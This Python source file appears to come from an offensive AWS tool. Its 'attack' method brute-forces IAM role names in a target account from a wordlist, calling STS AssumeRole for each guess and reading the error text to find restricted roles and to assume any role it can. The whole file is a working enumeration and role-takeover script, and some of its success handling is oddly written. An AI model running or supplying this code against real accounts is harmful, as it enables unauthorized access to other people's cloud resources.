import boto3
import botocore

class EnumRoles:
    pass
    def attack(self, account_id, key, secret):

        file = "./wordlist/word_list.txt"
        with open(file, 'r') as f:
            word_list = f.read().splitlines()

        client = boto3.client('sts',aws_access_key_id= key,
                aws_secret_access_key=secret)
        print("Starting enumeration on account_id %s" %(account_id))

        for word in word_list:
            role_arn = 'arn:aws:iam::%s:role/%s' %(account_id, word)
            try:
                response = client.assume_role(
                    RoleArn=role_arn,
                    RoleSessionName='test',
                    DurationSeconds=43200
                )

            except botocore.exceptions.ClientError as error:
                if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
                    response = client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName='test',
                        DurationSeconds=3600
                    )
                    print("Succesful assumed the role %s" %(role_arn))
                    break
                elif 'Not authorized to perform sts:AssumeRole' in str(error):
                    pass
                elif 'is not authorized to perform: sts:AssumeRole on resource' in str(error):
                    print("Found restricted role but not allowed to assume %s" %(role_arn))
